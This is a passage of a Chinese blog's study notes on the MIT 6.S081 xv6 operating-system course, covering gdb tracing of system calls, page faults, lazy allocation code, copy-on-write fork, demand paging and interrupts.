c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getcmd</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> nbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// fprintf(2, &quot;$ &quot;);</span></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;$&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, nbuf);</span><br><span class="line">  gets(buf, nbuf);</span><br><span class="line">  <span class="keyword">if</span> (buf[<span class="number">0</span>] == <span class="number">0</span>) <span class="comment">// EOF</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>write系统调用，它将“$ ”写入到文件描述符2.</p><p>用户代码的Shell调用write时，实际上调用的是关联到Shell的一个库函数。在usys.s。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">write:</span><br><span class="line"> li a7, SYS_write</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br></pre></td></tr></table></figure><p>看下<code>sh.asm</code>,，找到ecall的指令的地址，下断点：是0xdee</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000000dea &lt;write&gt;:</span><br><span class="line">.global write</span><br><span class="line">write:</span><br><span class="line"> li a7, SYS_write</span><br><span class="line">     dea:48c1                lia7,16</span><br><span class="line"> ecall</span><br><span class="line">     dec:00000073          ecall</span><br><span class="line"> ret</span><br><span class="line">     df0:8082                ret</span><br></pre></td></tr></table></figure><p>下断点：可以看下PC寄存器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0xdec</span><br><span class="line">Breakpoint 1 at 0xdee</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">[Switching to Thread 1.2]</span><br><span class="line"></span><br><span class="line">Thread 2 hit Breakpoint 1, 0x0000000000000dee <span class="keyword">in</span> ?? ()</span><br><span class="line">=&gt; 0x0000000000000dec:73 00 00 00ecall</span><br><span class="line">(gdb) <span class="built_in">print</span> <span class="variable">$pc</span></span><br><span class="line"><span class="variable">$1</span> = (void (*)()) 0xdec</span><br></pre></td></tr></table></figure><p>还可以<code>info reg</code>打印全部寄存器（user）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info reg</span><br><span class="line">ra             0xe8c    0xe8c</span><br><span class="line">sp             0x3e90   0x3e90</span><br><span class="line">gp             0x505050505050505        0x505050505050505</span><br><span class="line">tp             0x505050505050505        0x505050505050505</span><br><span class="line">t0             0x505050505050505        361700864190383365</span><br><span class="line">t1             0x505050505050505        361700864190383365</span><br><span class="line">t2             0x505050505050505        361700864190383365</span><br><span class="line">fp             0x3eb0   0x3eb0</span><br><span class="line">s1             0x12f1   4849</span><br><span class="line">a0             0x1      1</span><br><span class="line">a1             0x3e9f   16031</span><br><span class="line">a2             0x1      1</span><br><span class="line">a3             0x505050505050505        361700864190383365</span><br><span class="line">a4             0x505050505050505        361700864190383365</span><br><span class="line">a5             0x24     36</span><br><span class="line">a6             0x505050505050505        361700864190383365</span><br><span class="line">a7             0x10     16</span><br><span class="line">s2             0x24     36</span><br><span class="line">s3             0x0      0</span><br><span class="line">s4             0x25     37</span><br><span class="line">s5             0x2      2</span><br><span class="line">s6             0x3f50   16208</span><br><span class="line">s7             0x1438   5176</span><br><span class="line">s8             0x64     100</span><br></pre></td></tr></table></figure><p>a0，a1，a2是Shell传递给write系统调用的参数。所以a0是文件描述符2；a1是Shell想要写入字符串的指针；a2是想要写入的字符数。可以打印shell想要写入的字符串：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/2c <span class="variable">$a1</span></span><br><span class="line">0x12f0:36 <span class="string">&#x27;$&#x27;</span>0 <span class="string">&#x27;\000&#x27;</span></span><br></pre></td></tr></table></figure><p>系统调用是会有大量状态的变更，其中一个最重要的需要变更的状态，并且在它变更之前我们对它还有依赖的，就是是当前的<code>page table</code>。我们可以查看SATP寄存器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">print</span>/x <span class="variable">$satp</span></span><br><span class="line"><span class="variable">$3</span> = 0x8000000000087f63</span><br></pre></td></tr></table></figure><p>这里输出的是物理地址，page table的映射关系，QEMU可以打印：在qemu界面，ctrl a+c 进到qemu的console，输入<code>info mem</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(qemu) info mem</span><br><span class="line">vaddr            paddr            size             attr</span><br><span class="line">---------------- ---------------- ---------------- -------</span><br><span class="line">0000000000000000 0000000087f60000 0000000000001000 rwxu-a-</span><br><span class="line">0000000000001000 0000000087f5d000 0000000000001000 rwxu-a-</span><br><span class="line">0000000000002000 0000000087f5c000 0000000000001000 rwx----</span><br><span class="line">0000000000003000 0000000087f5b000 0000000000001000 rwxu-ad</span><br><span class="line">0000003fffffe000 0000000087f6f000 0000000000001000 rw---ad</span><br><span class="line">0000003ffffff000 0000000080007000 0000000000001000 r-x--a-</span><br></pre></td></tr></table></figure><p>attr这一列是PTE的标志位，u标志位（rwx后），它表明PTE_u标志位是否被设置，用户代码只能访问u标志位设置了的PTE。再下一个标志位是a（Accessed），表明这条PTE是不是被使用过。再下一个标志位d（Dirty）表明这条PTE是不是被写过。</p><p>最后两条PTE的虚拟地址非常大，非常接近虚拟地址的顶端，这两个page分别是<code>trapframe page</code>和<code>trampoline page</code>，都没有设置u标志，所以用户代码不能访问这两条PTE。一旦我们进入到了supervisor mode，就可以访问这两条PTE了。</p><h2 id="ECALL指令之后状态"><a href="#ECALL指令之后状态" class="headerlink" title="ECALL指令之后状态"></a>ECALL指令之后状态</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/3i 0xdee</span><br><span class="line">=&gt; 0xdee:ecall</span><br><span class="line">   0xdf2:ret</span><br><span class="line">   0xdf4:lia7,21</span><br><span class="line">(gdb) stepi</span><br><span class="line">0x0000000000000df2 <span class="keyword">in</span> ?? ()</span><br><span class="line">=&gt; 0x0000000000000df2:82 80ret</span><br></pre></td></tr></table></figure><p>能看出这里其实没进内核，，，试了好几次也不知道为啥，，</p><p>正常情况下，进去之后直接就到高地址了，，，，PC寄存器可以看到。（下面就按照假设进去之后</p><p>PC在<code>trampoline page</code>的最开始，要进行的指令是内核在<code>supervisor mode</code>中将要执行的最开始的几条指令，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># swap a0 and sscratch</span><br><span class="line"># so that a0 is TRAPFRAME</span><br><span class="line">csrrw a0, sscratch, a0</span><br><span class="line"># save the user registers in TRAPFRAME</span><br><span class="line">sd ra, 40(a0)</span><br><span class="line">sd sp, 48(a0)</span><br><span class="line">sd gp, 56(a0)</span><br><span class="line">sd tp, 64(a0)</span><br><span class="line">sd t0, 72(a0)</span><br><span class="line">........</span><br></pre></td></tr></table></figure><p><code>csrrw</code>指令交换了寄存器<code>a0</code>和<code>sscratch</code>的内容</p><p>现在在这个地址<code>0x3ffffff000</code>，也就是上面page table输出的最后一个page，<code>trampoline page</code>，这个page包含了内核的trap处理代码。ecall并不会切换page table。</p><h1 id="Chapter8"><a href="#Chapter8" class="headerlink" title="Chapter8"></a>Chapter8</h1><h2 id="page-fault-basics"><a href="#page-fault-basics" class="headerlink" title="page fault basics"></a>page fault basics</h2><p>这章内容是<code>page fault</code>，以及通过<code>page fault</code>可以实现的一系列虚拟内存功能。XV6中没有实现<code>page fault</code></p><p>下一个实验<code>lazy lab</code></p><p>虚拟内存的两个主要优点：</p><ul><li>隔离性</li><li>另一个好处是<code>level of indirection</code>，提供了一层抽象。处理器和所有的指令都可以使用虚拟地址，而内核会定义从虚拟地址到物理地址的映射关系。</li></ul><p>以上介绍的内存地址映射都相对静止，就是分配好就不动了。</p><p>下面介绍的<code>page fault</code>使这种映射变得动态起来。</p><p>通过page fault，内核可以更新page table。</p><p>什么样的信息是<code>page fault</code>必须得，或者说内核需要什么样的信息才能响应<code>page fault</code>？</p><ul><li>出错的虚拟地址</li><li>出错的原因</li><li>触发page fault的指令的地址：存放在SEPC（Supervisor Exception Program Counter）寄存器中，并同时会保存在trapframe-&gt;epc</li></ul><p>所以说有价值的信息为：引起page fault的内存地址、原因类型、程序计数器值。</p><h2 id="lazy-page-allocation"><a href="#lazy-page-allocation" class="headerlink" title="lazy page allocation"></a>lazy page allocation</h2><p>这小结讲的是Allocate，或者说是<code>sbrk</code>，sbrk是xv6的系统调用，用于增大heap，这里xv6的heap在stack的上面，即高地址，最起码ppt是这样显示的。</p><p>那么最开始的时候sbrk指向heap的底端，也就是stack的顶端，用sz字段表示，这里以<code>p-&gt;sz</code>表示。</p><p>这意味着，当sbrk实际发生或者被调用的时候，内核会分配一些物理内存，并将这些内存映射到用户应用程序的地址空间，然后将内存内容初始化为0，再返回sbrk系统调用。当然参数可正可负，本节只关注增加内存的情况。</p><p>sbrk的系统调用做的事情就是提升<code>p-&gt;sz</code>，加n，n是需要的page数。之后要将新的内存映射到page table。</p><p>改下sbrk的调用的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_sbrk</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> addr;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argint(<span class="number">0</span>, &amp;n) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">addr = myproc()-&gt;sz;</span><br><span class="line">myproc()-&gt;sz = myproc()-&gt;sz + n;</span><br><span class="line"><span class="comment">// if (growproc(n) &lt; 0)</span></span><br><span class="line"><span class="comment">//   return -1;</span></span><br><span class="line"><span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后echo下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> hi</span><br><span class="line">usertrap(): unexpected scause 0x000000000000000f pid=3</span><br><span class="line">            sepc=0x00000000000012ac stval=0x0000000000004008</span><br><span class="line">panic: uvmunmap: not mapped</span><br></pre></td></tr></table></figure><p>输出了：</p><ul><li>SCAUSE寄存器内容：表明这是一个store page fault</li><li>pid</li><li>SEPC寄存器值</li><li>出错的虚拟内存地址，STVAL寄存器：0x4008</li></ul><p>以上是错误信息。我们接下来看看如何能够聪明的处理这里的page fault。</p><p>usertrap:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// handle an interrupt, exception, or system call from user space.</span></span><br><span class="line"><span class="comment">// called from trampoline.S</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usertrap</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((r_sstatus() &amp; SSTATUS_SPP) != <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;usertrap: not from user mode&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// send interrupts and exceptions to kerneltrap(),</span></span><br><span class="line"><span class="comment">// since we&#x27;re now in the kernel.</span></span><br><span class="line">w_stvec((uint64)kernelvec);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line"><span class="comment">// save user program counter.</span></span><br><span class="line">p-&gt;trapframe-&gt;epc = r_sepc();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (r_scause() == <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// system call</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;killed)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sepc points to the ecall instruction,</span></span><br><span class="line"><span class="comment">// but we want to return to the next instruction.</span></span><br><span class="line">p-&gt;trapframe-&gt;epc += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// an interrupt will change sstatus &amp;c registers,</span></span><br><span class="line"><span class="comment">// so don&#x27;t enable until done with those registers.</span></span><br><span class="line">intr_on();</span><br><span class="line"></span><br><span class="line">syscall();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((which_dev = devintr()) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ok</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, r_scause(), p-&gt;pid);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;killed)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line"><span class="keyword">if</span> (which_dev == <span class="number">2</span>)</span><br><span class="line">yield();</span><br><span class="line"></span><br><span class="line">usertrapret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>usertrap</code>根据不同的<code>SCAUSE</code>完成不同操作。</p><p>Chapter6中是SCAUSE == 8时进入的trap，如果SCAUSE不等于8，接下来会检查是否有任何的设备中断，如果有的话处理相关的设备中断。如果两个条件都不满足，这里会打印一些信息，并且杀掉进程。</p><p>增加下scause为15时的内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((which_dev = devintr()) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ok</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (r_scause() == <span class="number">15</span>)</span><br><span class="line">&#123;</span><br><span class="line">uint64 va = r_stval();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;page fault %p\n&quot;</span>, va);</span><br><span class="line">uint64 ka = (uint64)kalloc();</span><br><span class="line"><span class="keyword">if</span> (ka == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>((<span class="keyword">void</span> *)ka, <span class="number">0</span>, PGSIZE);</span><br><span class="line">va = PGROUNDDOWN(va);</span><br><span class="line"><span class="keyword">if</span> (mappages(p-&gt;pagetable, va, PGSIZE, ka, PTE_W | PTE_U | PTE_R) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">kfree((<span class="keyword">void</span> *)ka);</span><br><span class="line">p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新分配的内存为0表示没物理内存分配了，杀掉进程；有的话，将物理内存page指向用户地址空间中合适的虚拟内存地址。</p><p>具体来说，我们首先将虚拟地址向下取整，这里引起page fault的虚拟地址是0x4008，向下取整之后是0x4000。之后我们将物理内存地址跟取整之后的虚拟内存地址的关系加到page table中。对应的PTE需要设置常用的权限标志位。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> hi</span><br><span class="line">page fault 0x0000000000004008</span><br><span class="line">page fault 0x0000000000013f48</span><br><span class="line">panic: uvmunmap: not mapped</span><br><span class="line">QEMU: Terminated</span><br></pre></td></tr></table></figure><p>但是并没有正常工作。uvmunmap在报错，它尝试unmap的page并不存在。这里unmap的内存是之前lazy allocation但是又没有实际分配的内存。</p><p>所以对于这个内存，并没有对应的物理内存。所以在uvmunmap函数中，当PTE的v标志位为0并且没有对应的mapping，这并不是一个实际的panic，这是预期的行为，改为continue：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uvmunmap</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, uint64 va, uint64 npages, <span class="keyword">int</span> do_free)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">uint64 a;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((va % PGSIZE) != <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;uvmunmap: not aligned&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (a = va; a &lt; va + npages * PGSIZE; a += PGSIZE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((pte = walk(pagetable, a, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;uvmunmap: walk&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">// panic(&quot;uvmunmap: not mapped&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (PTE_FLAGS(*pte) == PTE_V)</span><br><span class="line">panic(<span class="string">&quot;uvmunmap: not a leaf&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (do_free)</span><br><span class="line">&#123;</span><br><span class="line">uint64 pa = PTE2PA(*pte);</span><br><span class="line">kfree((<span class="keyword">void</span> *)pa);</span><br><span class="line">&#125;</span><br><span class="line">*pte = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后就可以直接执行了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ echo hi</span><br><span class="line">page fault <span class="number">0x0000000000004008</span></span><br><span class="line">page fault <span class="number">0x0000000000013f48</span></span><br><span class="line">hi</span><br></pre></td></tr></table></figure><blockquote><p>  学生提问：我并不能理解为什么在uvmunmap中可以直接改成continue？</p><p>  Frans教授：之前的panic表明，我们尝试在释放一个并没有map的page。怎么会发生这种情况呢？唯一的原因是sbrk增加了p-&gt;sz，但是应用程序还没有使用那部分内存。因为对应的物理内存还没有分配，所以这部分新增加的内存的确没有映射关系。我们现在是lazy allocation，我们只会为需要的内存分配物理内存page。如果我们不需要这部分内存，那么就不会存在map关系，这非常的合理。相应的，我们对于这部分内存也不能释放，因为没有实际的物理内存可以释放，所以这里最好的处理方式就是continue，跳过并处理下一个page。</p><p>  学生提问：在uvmunmap中，我认为之前的panic存在是有理由的，我们是不是应该判断一下，然后对于特定的场景还是panic？</p><p>  Frans教授：为什么之前的panic会存在？对于未修改的XV6，永远也不会出现用户内存未map的情况，所以一旦出现这种情况需要panic。但是现在我们更改了XV6，所以我们需要去掉这里的panic，因为之前的不可能变成了可能。</p></blockquote><h2 id="Zero-Fill-On-Demand"><a href="#Zero-Fill-On-Demand" class="headerlink" title="Zero Fill On Demand"></a>Zero Fill On Demand</h2><p>这节是基于page fault 和page table可以做的其他酷的事情。</p><p>BSS区域包含了未被初始化或者初始化为0的全局或者静态变量。</p><p>BSS段或许有很多个page，但是所有page都为0，调优的方法：在物理内存中，我只需要分配一个page，这个page的内容全是0，然后将所有虚拟地址空间的全0的page都map到这一个物理page上。这样至少在程序启动的时候能节省大量的物理内存分配。</p><p><img src="/2022/07/07/6.s081/image-20220720211117628.png" alt="image-20220720211117628"></p><p>这个PTE是只读的。如果更改BSS的一两个变量的值时，会page fault，解决办法：物理内存申请一个新的page，memset(0)，之后更新这个page的映射关系，这个PTE设置为可读可写。</p><h2 id="Copy-On-Write-Fork"><a href="#Copy-On-Write-Fork" class="headerlink" title="Copy On Write Fork"></a>Copy On Write Fork</h2><p>也是一个常见的优化，有时叫COW fork。</p><p>shell处理指令时，会fork子进程，之后exec，现在的情况是，fork创建了Shell地址空间的一个完整的拷贝，而exec做的第一件事情就是丢弃这个地址空间，取而代之的是一个包含了echo的地址空间。这里看起来有点浪费。</p><p>所以对于这个特定场景有一个非常有效的优化：当我们创建子进程时，直接共享父进程的物理内存page。</p><p>这里要小心些，因为隔离性，有些更新对父进程应不可见。</p><p>首先先把父子进程的PTE都设置为只读，之后修改的时候会page fault，分配新的物理page，然后将page fault相关的物理内存page拷贝到新分配的物理内存page中，并将新分配的物理内存page映射到子进程。新分配的物理内存page只对子进程的地址空间可见，设置PTE为可读写，原来page fault的物理page，只对父进程可见，相应的PTE对父进程也为可读写了。</p><p>PTE中有个copy-on-write标志位，RSW。</p><h2 id="Demand-Paging"><a href="#Demand-Paging" class="headerlink" title="Demand Paging"></a>Demand Paging</h2><p>也是一个流行的功能。</p><p>exec时os会加载text，data区域，并且以eager的方式将这些区域加载进page table。这里可以在稍后加载进page table。</p><p>so，对于exec，虚拟地址中，为text和data分配好地址段，但是相应的PTE并不对应任何物理内存page。对于这些PTE，只需要将valid bit位设置为0即可。</p><p>应用程序是从地址0开始运行。text区域从地址0开始向上增长。位于地址0的指令是会触发第一个page fault的指令。如何处理？这些page是on-demand page。需要在某个地方记录了这些page对应的程序文件，在page fault handler中需要从程序文件中读取page数据，加载到内存中；之后将内存page映射到page table；最后再重新执行指令，就可以执行了。</p><p>dirty page是曾经被写过的page，而non-dirty page是只被读过，但是没有被写过的page。</p><h2 id="Memory-Mapped-Files"><a href="#Memory-Mapped-Files" class="headerlink" title="Memory Mapped Files"></a>Memory Mapped Files</h2><p>将完整或者部分文件加载到内存中，这样就可以通过内存地址相关的load或者store指令来操纵文件。为了支持这个功能，一个现代的操作系统会提供一个叫做mmap的系统调用。这个系统调用会接收一个虚拟内存地址（VA），长度（len），protection，一些标志位，一个打开文件的文件描述符，和偏移量（offset）。</p><h1 id="Chapter9"><a href="#Chapter9" class="headerlink" title="Chapter9"></a>Chapter9</h1><p>产生中断后，操作系统需要做的是，保存当前的工作，处理中断，处理完成之后再恢复之前的工作。</p><p>中断与系统调用主要有3个小的差别：</p><ol><li>异步（asynchronous）。当硬件生成中断时，Interrupt handler与当前运行的进程在CPU上没有任何关联。但如果是系统调用的话，系统调用发生在运行进程的context下。</li><li>并发（concurrency）。对于中断来说，CPU和生成中断的设备是并行的在运行。网卡自己独立的处理来自网络的packet，然后在某个时间点产生中断，但是同时，CPU也在运行。所以我们在CPU和设备之间是真正的并行的，我们必须管理这里的并行。</li><li>program device。我们这节主要关注外部设备，例如网卡，UART，而这些设备需要被编程。每个设备都有一个编程手册，就像RISC-V有一个包含了指令和寄存器的手册一样。设备的编程手册包含了它有什么样的寄存器，它能执行什么样的操作，在读写控制寄存器的时候，设备会如何响应。不过通常来说，设备的手册不如RISC-V的手册清晰，这会使得对于设备的编程会更加复杂。</li></ol><p>接下来讨论终端中的$与按下键盘后ls是怎样在console显示出来的。</p><p>首先是中断的硬件部分。拿UART0举例，UART0会映射到内核内存地址的某处，而所有的物理内存都映射在地址空间的0x80000000之上。</p><p>下面是中断的软件部分。管理设备的代码称为驱动，所有的驱动都在内核中。</p><p>大部分的驱动都有bottom&#x2F;top两个部分：</p><ul><li>bottom部分通常是Interrupt handler。当一个中断送到了CPU，并且CPU设置接收这个中断，CPU会调用相应的Interrupt handler。Interrupt handler并不运行在任何特定进程的context中，它只是处理中断。</li><li>top部分是用户部分或者内核调用的接口</li></ul><p>通常情况下，驱动中会有一些队列（或者说buffer），top部分的代码会从队列中读写数据，而Interrupt handler（bottom部分）同时也会向队列中读写数据。</p><p>也没啥想看的，都在跟源码，，passpass</p><h1 id="Chapter10"><a href="#Chapter10" class="headerlink" title="Chapter10"></a>Chapter10</h1><p>本章内容为锁相关。</p><blockquote><p>  